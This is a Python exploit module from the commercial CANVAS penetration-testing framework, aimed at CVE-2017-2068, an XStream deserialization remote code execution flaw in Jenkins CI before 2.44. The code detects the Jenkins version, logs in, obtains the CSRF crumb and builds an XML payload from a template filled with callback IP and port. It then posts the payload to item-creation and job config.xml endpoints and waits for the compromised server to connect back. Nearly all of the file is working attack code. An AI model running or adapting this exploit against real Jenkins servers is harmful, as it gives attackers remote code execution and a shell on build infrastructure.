#!/usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2006
# http://www.immunityinc.com/CANVAS/ for more information

import sys
import re
import os
import json
import base64
import struct
import socket
import urllib
import random
import logging

from urllib import quote
from time import sleep

if "." not in sys.path:
    sys.path.append(".")

import canvasengine

import libs.spkproxy as spkproxy

from exploitutils import *
from tcpexploit import *
from canvasexploit import *


NAME                            = "jenkins_xstream_rce"
DESCRIPTION                     = "Jenkins CI XStream Remote Code Execution"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Jenkins"
DOCUMENTATION['Repeatability']  = "Infinite"
DOCUMENTATION['CVE Name']       = "CVE-2017-2068"
DOCUMENTATION['CVE Url']        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-2068"
DOCUMENTATION['References']     = ['https://wiki.jenkins-ci.org/display/SECURITY/Jenkins+Security+Advisory+2017-02-01',
                                   'https://github.com/jenkinsci/jenkins/blob/b4095bc4b6c62023a2029e5e2faef8ad0e3a4252/test/src/test/java/hudson/util/XStream2Security383Test.java',
                                   'https://github.com/jenkinsci/jenkins/blob/b4095bc4b6c62023a2029e5e2faef8ad0e3a4252/test/src/test/resources/hudson/util/XStream2Security383Test/config.xml'
]

VERSION                         = "1.0"
PROPERTY                        = {}
PROPERTY['TYPE']                = "Web Exploits"
PROPERTY['SITE']                = "Remote"
# PROPERTY['ARCH']                = [""]
PROPERTY['VERSION']             = ["All"]

DOCUMENTATION['NOTES'] = """
XStream-based APIs in Jenkins CI previous to version 2.44 are vulnerable to a remote code execution
vulnerability involving the deserialization of various types in javax.imageio package

Authentication is required to reach the vulnerable endpoints, however a normal user (non-admin) can
reach these endpoints when the Role Strategy plugin is not installed (which is not by default).

Tested versions:
> Ubuntu Linux 16.04 LTS - 64bit
    - Jenkins 2.43 on Tomcat 8.0.30 with Java SE 8 / 7
    - Jenkins 1.634, 2.0 & 2.43 on Tomcat 8.5.16 with Java SE 8 / 7
> Ubuntu Linux 14.04 - 32bit
    - Jenkins 1.598 with Sun JRE v1.7.0_21
"""

CHANGELOG = """
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port               = 8080
        self.host               = ""
        self.version            = 0
        self.done               = 0
        self.ssl                = ""
        self.name               = NAME
        self.basepath           = ""

        self.respath            = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
        self.mosdef_type        = "UNIVERSAL"
        self.mosdef_debug       = False #XXX: this should not be enabled in release!
        self.http_ssl           = False

        # self.command            = None
        self.basicauth_user     = ""
        self.basicauth_password = ""

        self.jenkins_user       = ""
        self.jenkins_password   = ""

        self.hostname           = None
        self.content_type       = ""

        self.targetpath         = "/"
        self.base_url           = ""

        self.ua = None

        # MOSDEF options
        self.autoFind = False

        self.version_re = re.compile("Jenkins ver\. (?P<version>[\d\.]+)\<")

        self.endpoint_paths = ("/",
                               "/view/all/",
                               "/me/my-views/view/all/")

        self.endpoint_names = ("createItem?name=" + randomstring(8), "config.xml")

        self.jenkins_version = None

        return

    def neededListenerTypes(self):
        mosdef_type = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()

        if mosdef_type == "HTTP":
            if self.http_ssl:
                return [canvasengine.HTTPMOSDEF_SSL]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.UNIVERSAL_MOSDEF]

    def needs_mosdef_http(self):
        mosdef_type = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()
        return mosdef_type == "HTTP"

    def needs_mosdef_ssl(self):
        return self.http_ssl

    def getargs(self):
        """
        Get arguments for attack
        """
        self.mosdef_type        = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()
        #TODO: make this a parameter in the dialog?
        self.mosdef_debug       = self.argsDict.get("mosdef_debug", self.mosdef_debug)
        self.host               = self.target.interface
        self.port               = int(self.argsDict.get("port",self.port))
        self.basepath           = self.argsDict.get("basepath",self.basepath)
        self.ssl                = self.argsDict.get("ssl",self.ssl)
        self.basicauth_user     = self.argsDict.get("basicauth_user", self.basicauth_user)
        self.basicauth_password = self.argsDict.get("basicauth_password", self.basicauth_password)
        self.jenkins_user       = self.argsDict.get("jenkins_user", self.jenkins_user)
        self.jenkins_password   = self.argsDict.get("jenkins_password", self.jenkins_password)

        if not self.hostname:
            self.hostname = self.host

        if self.ssl:
            protocol = "https"
        else:
            protocol = "http"

        self.base_url = protocol + "://" + self.hostname + ":" + str(self.port) + self.basepath

        self.ua = self.setup_UA()

        return

    def setup_UA(self):
        """
        Setup everything needed to do requests using spkproxy
        """
        if self.basicauth_user and self.basicauth_password:
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)
            logging.info("Using BasicAuth (User: %s - Password: %s)" % (self.basicauth_user, self.basicauth_password))
        else:
            auth = None

        ua = spkproxy.UserAgent(self.base_url, auth=auth, hostname=self.hostname, exploit=self)

        #XXX: SETTING THE PROXY FOR TESTING. Do not use in release!
        #ua = spkproxy.UserAgent(self.base_url, auth=auth, hostname=self.hostname, exploit=self, proxyhost="localhost", proxyport=8888)
        return ua

    def login_jenkins(self):
        """
        We need to be authenticated to Jenkins to reach the vulnerable endpoints
        """
        #TODO: check if the endpoint and expected payload is the same in old versions
        # Jenkins 1.634 does not require auth by default
        if self.jenkins_version is not None and self.jenkins_version[0] == 1:
            logging.warning("Jenkins 1.x does not require authentication by default. Skipping login...")
            return True

        login_url = "/j_acegi_security_check"
        login_payload = {
            "j_username"    : self.jenkins_user,
            "j_password"    : self.jenkins_password,
            "json"          : """{"j_username": "%s", "j_password": "%s", "remember_me": false }""" % (self.jenkins_user, self.jenkins_password),
            "Submit"        : "log in"
        }
        (response, response_code) = self.ua.POST(login_url, login_payload, extraheaders=None, return_response_code=True)

        #XXX: is this the right way to check if login worked?
        if response_code == 302:
            return True

        return False

    def get_jenkins_crumb(self):
        """
        Jenkins CI has a token called Crumb (for CSRF apparently) but when using the APIs
        we can submit a request to get the value for our current session and then include it
        in our requests in the Jenkins-Crumb header
        """
        #TODO: check if older jenkins versions need the crumb header and if url to get it is the same

        # Jenkins 1.634 does not use the crumb
        if self.jenkins_version is not None and self.jenkins_version[0] == 1:
            logging.info("Jenkins 1.x does not use Crumb values")
            return ""

        logging.info("Obtaining Jenkins CI Crumb value...")
        crumb_url = "/crumbIssuer/api/json"
        crumb_value = ""

        data = self.ua.GET(crumb_url, noresponse=False)
        try:
            crumb_data = json.loads(data)
            crumb_value = crumb_data.get('crumb')
        except Exception: #XXX: might be better to only catch TypeError and ValueError
            # just in case we get an empty response or some invalid data
            pass

        logging.info("Jenkins-Crumb: " + crumb_value)
        return crumb_value

    def send_exploit_request(self, crumb_value="", payload="", try_all_endpoints=False):
        logging.info("Attacking %s:%d" % (self.hostname, self.port))
        logging.info("Basic Auth User: %s" % self.basicauth_user)
        logging.info("VHost: %s" % self.hostname)

        stop_attacking = False

        host_field = "%s:%s" % (self.hostname, self.port)
        self.ua.addHeader("Host", host_field)
        self.ua.addHeader("Jenkins-Crumb", crumb_value)
        self.ua.addHeader("Content-Type", "application/xml")

        # we try different paths and diff endpoints
        for epath in self.endpoint_paths:
            if stop_attacking:
                break

            for ename in self.endpoint_names:
                url = epath + ename
                logging.info("Attacking endpoint " + url)

                (response, response_code) = self.ua.POST(url, payload,
                                                    extraheaders=None,
                                                    return_response_code=True)

                # we only check for success and keep trying all endpoints if instructed to
                if not try_all_endpoints:
                    return

                #TODO: is 403 the only code returned if exploitation failed?
                if response_code == 403:
                    logging.error("%s failed! 403 code was returned" % url)

                #TODO: should we also do the retry if code is not 500?
                elif response_code == 500:
                    logging.warning("Code 500 was returned. Our payload probably worked. Wait for connect back (5 seconds)")
                    time.sleep(5)
                    #XXX: there is a potential logic issue here...
                    # If the connect back takes more than 5 secs but works then this exploit might spawn
                    # several nodes because it will send the payload to all endpoints

                    # if the connect back worked then we stop trying with other endpoints
                    if self.ISucceeded():
                        stop_attacking = True
                        break # to stop de endpoint_names for loop

        # if none of the previous endpoints worked then we can try with the config.xml endpoint on existing jobs
        if not self.ISucceeded():
            jobs = self.get_jenkins_jobs()
            for jobname in jobs:
                url = "/job/%s/config.xml" % jobname
                (response, response_code) = self.ua.POST(url, payload,
                                                      extraheaders=None,
                                                      return_response_code=True)
                if response_code == 403:
                    logging.error("%s failed! 403 code was returned" % url)
                elif response_code == 500:
                    logging.warning("Code 500 was returned. Our payload probably worked. Wait for connect back (5 seconds)")
                    time.sleep(5)
                    # if the connect back worked then we stop trying with other endpoints
                    if self.ISucceeded():
                        break

        return

    def get_jenkins_version(self):
        logging.info("Obtaining Jenkins CI version...")

        (response, response_code) = self.ua.GET("/login",
                                                noresponse=False,
                                                entireresponse=True,
                                                return_response_code=True)

        if response_code == 200:
            version = self.extract_regex_result(response, self.version_re, "version")
            logging.info("Jenkins CI version: " + str(version))
            self.jenkins_version = map(int, version.split("."))
        else:
            logging.error("Failed to obtain Jenkins version")

    def get_jenkins_jobs(self):
        """
        Tries to obtain information about any existing job we could use to submit
        a new config in order to trigger the exploit using the /config.xml endpoint
        """
        #TODO: implement this
        # Perhaps if a user is not allowed to create new items but there are existing items,
        # then the config.xml endpoint is the one we need to use instead in those cases (this needs further testing)
        base_api_url = "/api/json"
        logging.info("Getting jobs info via " + base_api_url)

        jobs = []
        data = self.ua.GET(base_api_url, noresponse=False)
        try:
            json_data = json.loads(data)
            jobs = json_data.get('jobs')
        except Exception:  #XXX: might be better to only catch TypeError and ValueError
            # just in case we get an empty response or some invalid data
            pass

        self.debuglog("jobs info: " + str(jobs))
        return jobs

    def version_test(self):
        """
        Check if Jenkin version is vulnerable to this
        Only Jenkins < 2.44 are affected
        """
        choice = False
        if self.jenkins_version is not None:
            major = self.jenkins_version[0]
            minor = self.jenkins_version[1]
            if major <= 2:
                if major == 2:
                    if minor < 44:
                        choice = True
                else:
                    choice = True
        return choice

    def test(self):
        self.getargs()

        logging.info("Testing %s:%d" % (self.hostname, self.port))
        logging.info("Basic Auth User: %s" % self.basicauth_user)
        logging.info("VHost: %s" % self.hostname)

        self.get_jenkins_version()

        return self.version_test()

    def extract_regex_result(self, text, regex, field_name):
        result = regex.search(text)

        if not result:
            return None
        else:
            result_dict = result.groupdict()
            if field_name not in result_dict:
                return None
            else:
                return result_dict[field_name]

    def create_payload(self):

        self.needs_mosdef_http()

        # Select the template corresponding to the Jenkins version we detected
        # If version was not detected we default to 2.x
        template_name = "payload_template_%d.x.xml" % (self.jenkins_version[0] if self.jenkins_version is not None else 2)
        self.debuglog("Using payload template %s" % template_name)

        payload = ""
        template_path = os.path.join(self.respath, template_name)
        with open(template_path, 'r') as f:
            payload = f.read()

        # populate template with Mosdef connect back info (ip, port, type, ssl)
        payload = payload.replace("[MOSDEF_HOSTNAME]", self.callback.ip)
        payload = payload.replace("[MOSDEF_PORT]", str(self.callback.port))
        payload = payload.replace("[MOSDEF_ID]",str(self.engine.getNewMosdefID(self)))
        payload = payload.replace("[MOSDEF_CONNECTION_TYPE]", "1" if self.needs_mosdef_http() else "0")
        payload = payload.replace("[MOSDEF_USESSL]", str(self.ssl).lower())
        payload = payload.replace("[MOSDEF_DEBUG]", str(self.mosdef_debug).lower())
        payload = payload.replace("[GROOVY_SCRIPT_NAME]", randomstring(8))

        return payload

    def run(self):
        self.getargs()

        failed = True

        self.setInfo("%s attacking %s:%d (in progress)" % (self.name, self.host, self.port))
        logging.info("Using version: %s" % self.version)

        self.get_jenkins_version()

        if self.login_jenkins():
            self.setProgress(25)

            jenkins_crumb = self.get_jenkins_crumb()
            self.setProgress(50)

            payload = self.create_payload()
            self.setProgress(75)

            self.send_exploit_request(jenkins_crumb, payload, True)
            self.setProgress(100)

            if self.ISucceeded():
                self.setInfo("Exploit finished successfully")
                failed = False
            else:
                logging.critical("All vulnerable endpoints failed")
                self.setInfo("Exploit failed!")
        else:
            logging.critical("Jenkins login failed")
            logging.debug("Jenkins login failed - Valid credentials are required to be able to reach vulnerable endpoints")
            self.setInfo("Exploit failed!")

        self.setProgress(100)

        return 1 if not failed else 0

    def usage(self):
        logging.info("Example: " + sys.argv[0] + " -t 172.16.100.142 -l 172.16.100.1 -d 5555")
        logging.info("-t <target ip>")
        logging.info("-p <target port>                 [optional]")
        logging.info("-O basepath: /path/to/jenkins/   [optional]")
        logging.info("-O hostname: target vhost        [optional]")
        logging.info("-O jenkins_user: Jenkins username")
        logging.info("-O jenkins_password: Jenkins password")
        logging.info("-l call back ip for standard callback")
        logging.info("-d listening port for callback")
        return


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)